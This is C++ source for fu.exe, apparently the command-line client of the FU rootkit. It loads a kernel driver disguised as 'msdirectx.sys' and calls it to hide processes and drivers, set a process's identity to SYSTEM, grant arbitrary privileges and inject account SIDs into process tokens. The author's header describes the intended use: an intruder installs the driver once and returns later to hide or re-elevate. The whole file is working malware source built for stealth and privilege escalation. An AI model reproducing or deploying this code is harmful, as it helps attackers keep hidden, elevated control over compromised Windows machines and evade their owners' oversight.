///////////////////////////////////////////////////////////////////////////////////////
// Filename fu.cpp
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: fu.exe is a command line program that loads a driver to do the work.
//              The driver is never unloaded until reboot. You could have used other
//				methods to load the driver such as SystemLoadAndCallImage suggested
//				by Greg Hoglund. fu is a play on the UNIX command su. fu and its 
//				associated driver can change the groups and privileges on any process.
//				It can also hide a process. It does all this by direct Object 
//              manipulation. No worries about do I have permission to that process,
//				token, etc. If you can load a driver once, you are golden! The scenario
//				would be you gain access at some elevated privilege and install the
//              driver, then in the future you come back as whoever and hide yourself 
//              or give yourself the privilege you need.
//
// Notes:		I did not expose the driver hiding in the Usage help function. It relies
//				upon the non-exported symbol, PsLoadedModuleList. I have only two observed
//				machines on which to base my hardcoded address. I suggest the user do some
//				more research or at least use at her/his own risk.
//
// Date:    12/05/2003
// Version: 2.0

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winioctl.h>

#include "fu.h"
#include "..\SYS\ioctlcmd.h"
#include "Instdrv.h"

static CHAR ac_driverLabel[] = "msdirectx";
static CHAR ac_driverName[] = "msdirectx.sys";


DWORD InitDriver()
{

	int iRetCode = ERROR_SUCCESS;
	HANDLE h_Device = INVALID_HANDLE_VALUE;
	DWORD  d_bytesRead, d_error;
	CHAR ac_driverPath[MAX_PATH];
	
    OSVERSIONINFOEX osvi;
    BOOL bOsVersionInfoEx;
	BOOL Found = FALSE;

	int  pid_offset = 0;
	int  flink_offset = 0;
	int  authid_offset = 0;
	int  token_offset = 0; 
	int  privcount_offset = 0;
	int  privaddr_offset  = 0;
	int  sidcount_offset = 0;
	int  sidaddr_offset  = 0;

	int  *os_offsets;

	try 
	{		
		if (Initialized)
		{
			return iRetCode;
		}



		// Try calling GetVersionEx using the OSVERSIONINFOEX structure.
		// If that fails, try using the OSVERSIONINFO structure.

		ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

		if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
		{
			// If OSVERSIONINFOEX doesn't work, try OSVERSIONINFO.
			osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
			if (! GetVersionEx ( (OSVERSIONINFO *) &osvi) ) 
			return -1;
		}

		switch (osvi.dwPlatformId)
		{
			// Tests for Windows NT product family.
			case VER_PLATFORM_WIN32_NT:

			// Test for the product.

				if ( osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				{
					//fprintf(stderr, "Microsoft Windows NT 4.0 ");
					pid_offset = 148;
					flink_offset = 152;
					authid_offset = 24;
					token_offset = 264; 
					privcount_offset = 52;
					privaddr_offset  = 80;
					sidcount_offset = 48;
					sidaddr_offset  = 72;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && \
					      osvi.dwMinorVersion == 0 )
				{
					//fprintf(stderr, "Microsoft Windows 2000 ");
					pid_offset = 156;
					flink_offset = 160;
					authid_offset = 0x18;
					token_offset = 0x12c; 
					privcount_offset = 0x44;
					privaddr_offset  = 0x64;
					sidcount_offset = 0x3c;
					sidaddr_offset  = 0x58;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
				{
					//fprintf(stderr, "Microsoft Windows XP ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 72;
					privaddr_offset  = 104;
					sidcount_offset = 64;
					sidaddr_offset  = 92;

					/* For Service Pack 2 Beta??
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;
					*/

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
				{
					//fprintf(stderr, "Microsoft Windows Server 2003 ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;

					Found = TRUE;
				}

      // Display version, service pack (if any), and build number.
	  /*		
			if ( osvi.dwMajorVersion <= 4 )
			{
				fprintf(stderr, "version %d.%d %s (Build %d)\n",
				osvi.dwMajorVersion,
				osvi.dwMinorVersion,
				osvi.szCSDVersion,
				osvi.dwBuildNumber & 0xFFFF);
			}
			else
			{ 
				fprintf(stderr, "%s (Build %d)\n",
				osvi.szCSDVersion,
				osvi.dwBuildNumber & 0xFFFF);
			}
	  */	
         break;

	  default:
		  fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n", osvi.dwMajorVersion, osvi.dwMinorVersion); 
		  return -1;
		  break; // Never executed
		}
	if (!Found)
	{
		fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n",
			osvi.dwMajorVersion,
			osvi.dwMinorVersion); 
		return -1;
	}
	else 
	{
		if (GetCurrentDirectory(MAX_PATH, ac_driverPath))
		{
			strncat(ac_driverPath, "\\", MAX_PATH-strlen(ac_driverPath));
			strncat(ac_driverPath, ac_driverName, MAX_PATH-strlen(ac_driverPath));
		}
		LoadDeviceDriver(ac_driverLabel, ac_driverPath ,&h_Device, &d_error);
		if (h_Device == INVALID_HANDLE_VALUE)
		{
			fprintf(stderr, "Unable to Load Driver");
			throw d_error;
		}
		gh_Device = h_Device;


		os_offsets = (int *)calloc(1, sizeof(int)*8);
		if (!os_offsets)
		{
			fprintf(stderr, "Memory allocation failed.\n");
			return -1;
		}

		memcpy(os_offsets, &pid_offset, sizeof(int));
		memcpy(os_offsets + 1, &flink_offset, sizeof(int));
		memcpy(os_offsets + 2, &authid_offset, sizeof(int));
		memcpy(os_offsets + 3, &token_offset, sizeof(int));
		memcpy(os_offsets + 4, &privcount_offset, sizeof(int));
		memcpy(os_offsets + 5, &privaddr_offset, sizeof(int));
		memcpy(os_offsets + 6, &sidcount_offset, sizeof(int));
		memcpy(os_offsets + 7, &sidaddr_offset, sizeof(int));

		if(!DeviceIoControl(gh_Device, IOCTL_ROOTKIT_INIT,
							os_offsets,
							sizeof(int)*8,
							NULL,
							0,
							&d_bytesRead,
							NULL))
		{
			fprintf(stderr, "Error Initializing Driver with offsets.\n");
			throw;
		}
		if (os_offsets)
			free(os_offsets);
	}
	}catch (DWORD error) {
      LPVOID lpMsgBuf = NULL;
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);

	  return -1;	
	} catch (...) {
      LPVOID lpMsgBuf = NULL;
	  DWORD error = 0;
      error = GetLastError();
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);	
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);

      return -1;	
	}

	Initialized = TRUE;
	return (iRetCode);
} //InitDriver()


DWORD ListDriv(void)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_LISTDRIV,
					NULL,
					0,
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;
}

DWORD HideDriv(char *driver_name)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEDRIV,
					(void *) driver_name,
					(DWORD) strlen(driver_name),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

DWORD ListProc(void *buffer, int buff_size)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	if (buffer == NULL)
		return ERROR_INVALID_ADDRESS;

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_LISTPROC,
					NULL,
					0,
					buffer,
					buff_size,
					&d_bytesRead,
					NULL);
	
	return d_bytesRead; // Return the number of bytes actually written to the buffer	
}

DWORD HideProc(DWORD pid)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEME,
					(void *) &pid,
					sizeof(DWORD),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

int ListPriv(void)
{

	printf("\n\nSeCreateTokenPrivilege\n");
	printf("SeAssignPrimaryTokenPrivilege\n");
	printf("SeLockMemoryPrivilege\n");
	printf("SeIncreaseQuotaPrivilege\n");
	printf("SeUnsolicitedInputPrivilege\n");
	printf("SeMachineAccountPrivilege\n");
	printf("SeTcbPrivilege\n");
	printf("SeSecurityPrivilege\n");
	printf("SeTakeOwnershipPrivilege\n");
	printf("SeLoadDriverPrivilege\n");
	printf("SeSystemProfilePrivilege\n");
	printf("SeSystemtimePrivilege\n");
	printf("SeProfileSingleProcessPrivilege\n");
	printf("SeIncreaseBasePriorityPrivilege\n");
	printf("SeCreatePagefilePrivilege\n");
	printf("SeCreatePermanentPrivilege\n");
	printf("SeBackupPrivilege\n");
	printf("SeRestorePrivilege\n");
	printf("SeShutdownPrivilege\n");
	printf("SeDebugPrivilege\n");
	printf("SeAuditPrivilege\n");
	printf("SeSystemEnvironmentPrivilege\n");
	printf("SeChangeNotifyPrivilege\n");
	printf("SeRemoteShutdownPrivilege\n");
	printf("SeUndockPrivilege\n");
	printf("SeSyncAgentPrivilege\n");
	printf("SeEnableDelegationPrivilege\n");

	return 27;
}


DWORD SetPriv(DWORD pid, void *priv_luids, int priv_size)
{
	DWORD d_bytesRead;
	DWORD success;
	
	PLUID_AND_ATTRIBUTES pluid_array;
	LUID pluid;
	VARS dvars;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	if (priv_luids == NULL)
		return ERROR_INVALID_ADDRESS;

	pluid_array = (PLUID_AND_ATTRIBUTES) calloc(priv_size/32, sizeof(LUID_AND_ATTRIBUTES));
	if (pluid_array == NULL)
		return ERROR_NOT_ENOUGH_MEMORY;

	DWORD real_luid = 0;
	for (int i = 0; i < priv_size/32; i++)
	{
		if(LookupPrivilegeValue(NULL, (char *)priv_luids + (i*32), &pluid))
		{	
			memcpy(pluid_array+i, &pluid, sizeof(LUID));
			(*(pluid_array+i)).Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT;
			real_luid++;
		}
	}
	dvars.the_pid = pid;
	dvars.pluida = pluid_array;
	dvars.num_luids = real_luid;

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_SETPRIV,
					(void *) &dvars,
					sizeof(dvars),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	if(pluid_array)
		free(pluid_array);
	return success;	
}


DWORD SetAuthID(DWORD pid, PSID my_sid, DWORD sid_size)
{
	DWORD d_bytesRead;
	DWORD success;
	VARS2 my_var;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	if ((pid == 0) || (my_sid == NULL) || (sid_size == 0))
		return ERROR_INVALID_ADDRESS;

	my_var.the_pid = pid;
	my_var.pSID = my_sid;
	my_var.d_SidSize = sid_size;

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_SETAUTHID,
					(void *) &my_var,
					sizeof(VARS2),
					NULL,
					0,
					&d_bytesRead,
					NULL);

	return success;	


}

DWORD SetSid(DWORD pid, PSID my_sid, DWORD sid_size)
{

	DWORD d_bytesRead;
	DWORD success;
	VARS2 my_var;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	if ((pid == 0) || (my_sid == NULL) || (sid_size == 0))
		return ERROR_INVALID_ADDRESS;

	my_var.the_pid = pid;
	my_var.pSID = my_sid;
	my_var.d_SidSize = sid_size;

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_SETSID,
					(void *) &my_var,
					sizeof(VARS2),
					NULL,
					0,
					&d_bytesRead,
					NULL);

	return success;	


}

void ShowUsage()
{
		printf("Usage: fu\n"); 
		printf("\t[-pl]  #number   to list the first #number of processes\n"); 
		printf("\t[-ph]  #PID      to hide the process with #PID\n");
		printf("\t[-pld]		 to list the named drivers in DbgView\n"); 
		printf("\t[-phd] DRIVER_NAME to hide the named driver\n"); 
		printf("\t[-pas] #PID      to set the AUTH_ID to SYSTEM on process #PID\n");
		printf("\t[-prl]		 to list the available privileges\n"); 
		printf("\t[-prs] #PID #privilege_name to set privileges on process #PID\n");
		printf("\t[-pss] #PID #account_name to add #account_name SID to process #PID token\n\n");
		return;
}

void PrintError(char *out_string, DWORD code)
{
	LPVOID lpMsgBuf = NULL;

	fprintf(stderr, "%s\n", out_string);
    
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
				  FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
				  NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
				  (LPTSTR) &lpMsgBuf, 0, NULL);
	fprintf(stderr, "%s\n",lpMsgBuf);
	
	if (lpMsgBuf)
		LocalFree(lpMsgBuf);

	return;	
}


void main(int argc, char **argv)
{
	const int PROCNAMELEN = 26;
	char *buffer, *start;
	DWORD status;

	if (argc > 1)
	{
		if (InitDriver() == -1)
		{
			fprintf(stderr, "Failed to initialize driver.\n");
			return;
		}
		if (strcmp((char *)argv[1], "-prl") == 0)
			ListPriv();
		else if (strcmp((char *)argv[1], "-pld") == 0)
			ListDriv();
		else if (strcmp((char *)argv[1], "-phd") == 0)
		{
			if (argc != 3)
			{
				ShowUsage();
				return;
			}
			status = HideDriv(argv[2]);
			if (status == 0)
			{
				PrintError("Hiding driver failed. ", GetLastError());
			}
		}
		else if (strcmp((char *)argv[1], "-prs") == 0)
		{
			char *priv_array = NULL;
			DWORD pid = 0;

			if (argc < 4)
			{
				ShowUsage();
				return;
			}
			pid = atoi(argv[2]);
			
			priv_array = (char *)calloc(argc-3, 32);
			if (priv_array == NULL)
			{
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}

			int size = 0;
			for(int i = 3; i < argc; i++)
			{
				if(strncmp(argv[i], "Se", 2) == 0)
				{
					strncpy((char *)priv_array + ((i-3)*32), argv[i], 31);
					size++;
				}
				
			}
		
			status = SetPriv(pid, priv_array, size*32);
			if (status == 0)
			{
				PrintError("Setting process privilege failed. ", GetLastError());
			}

			if(priv_array)
				free(priv_array);
		}
		else if (strcmp((char *)argv[1], "-ph") == 0)
		{
			if (argc != 3)
			{
				ShowUsage(); //printf("You must follow -ph with the PID of the process to hide.\n");
				return;
			}
		
			DWORD pid = atoi(argv[2]);
			status = HideProc(pid);
			if (status == 0)
			{
				PrintError("Hiding process failed. ", status);
			}
		}
		else if (strcmp((char *)argv[1], "-pl") == 0)
		{
			if (argc != 3)
			{
				printf("You must follow -pl with the number of processes to list.\n");
				return;
			}
			int size = atoi(argv[2]);
			buffer = (char *)calloc(1,size * PROCNAMELEN);
			if (buffer == NULL)
			{
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}
			start = buffer;
			size = ListProc(buffer, size*PROCNAMELEN);
			size /= PROCNAMELEN;
			int ploop = 1;
			while(ploop <= size)
			{
				printf("Process: %s\n",buffer);
				buffer += PROCNAMELEN;
				ploop++;
			}
			printf("Total number of processes = %d\n",size);
			if(start)
				free(start);
		}

		else if (strcmp((char *)argv[1], "-pas") == 0)
		{
			char *sname = "System";
			DWORD d_SIDSize = 0;
			DWORD d_domSize = 0;
			LPTSTR lp_domName = NULL;
			PSID my_SID = NULL;
			PSID_NAME_USE sid_use = NULL;
			BOOL success = FALSE;
			DWORD pid; 

			if (argc > 2)
				pid = atoi(argv[2]);
			else
			{
				ShowUsage(); //printf("Missing the PID\n");
				return;
			}
			LookupAccountName(NULL,
							  sname,
							  my_SID,
							  &d_SIDSize,
							  lp_domName,
							  &d_domSize,
							  sid_use);
			
			my_SID = (PSID) calloc(1, d_SIDSize);
			if (my_SID == NULL)
			{
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}
			
			lp_domName = (LPTSTR) calloc(1, d_domSize*sizeof(TCHAR));
			if (lp_domName == NULL)
			{
				if(my_SID)
					free(my_SID);
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}
			sid_use = (_SID_NAME_USE *) calloc(1, sizeof(_SID_NAME_USE));
			if (sid_use == NULL)
			{
				if(lp_domName)
					free(lp_domName);
				if(my_SID)
					free(my_SID);
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}

			success = LookupAccountName(NULL,
										sname,
										my_SID,
										&d_SIDSize,
										lp_domName,
										&d_domSize,
										sid_use);
			if (success == 0)
			{
				PrintError("Failed to lookup System SID.", GetLastError());
				if(lp_domName)
					free(lp_domName);
				if(sid_use)
					free(sid_use);
				if(my_SID)
					free(my_SID);
				return;
			}
			status = SetAuthID(pid, my_SID, d_SIDSize);
			if (status == 0)
			{
				PrintError("Setting AuthID failed. ", GetLastError());
			}

			if(lp_domName)
				free(lp_domName);
			if(sid_use)
				free(sid_use);
			if(my_SID)
				free(my_SID);
		}
		else if (strcmp((char *)argv[1], "-pss") == 0)
		{
			char *sname = NULL;
			DWORD d_SIDSize = 0;
			DWORD d_domSize = 0;
			LPTSTR lp_domName = NULL;
			PSID my_SID = NULL;
			PSID_NAME_USE sid_use = NULL;
			BOOL success = FALSE;
			DWORD pid; 

			if (argc != 4)
			{
				ShowUsage();
				return;
			}
			pid = atoi(argv[2]);
			sname = argv[3];

			LookupAccountName(NULL,
							  sname,
							  my_SID,
							  &d_SIDSize,
							  lp_domName,
							  &d_domSize,
							  sid_use);

			my_SID = (PSID) calloc(1, d_SIDSize);
			if (my_SID == NULL)
			{
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}
			
			lp_domName = (LPTSTR) calloc(1, d_domSize*sizeof(TCHAR));
			if (lp_domName == NULL)
			{
				if(my_SID)
					free(my_SID);
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}
			sid_use = (_SID_NAME_USE *) calloc(1, sizeof(_SID_NAME_USE));
			if (sid_use == NULL)
			{
				if(lp_domName)
					free(lp_domName);
				if(my_SID)
					free(my_SID);
				fprintf(stderr, "Failed to allocate memory!\n");
				return;
			}

			success = LookupAccountName(NULL,
										sname,
										my_SID,
										&d_SIDSize,
										lp_domName,
										&d_domSize,
										sid_use);
			if (success == 0)
			{
				PrintError("LookupAccountName failed. ", GetLastError());
				if(lp_domName)
					free(lp_domName);
				if(sid_use)
					free(sid_use);
				if(my_SID)
					free(my_SID);
				return;
			}
			status = SetSid(pid, my_SID, d_SIDSize);
			if (status == 0)
			{
				PrintError("Setting SID failed. ", GetLastError());
			}
			if(lp_domName)
				free(lp_domName);
			if(sid_use)
				free(sid_use);
			if(my_SID)
				free(my_SID);

		}
		else
		{
			ShowUsage();
		}
	}
	else
	{
		ShowUsage();
	}
  
	return;
}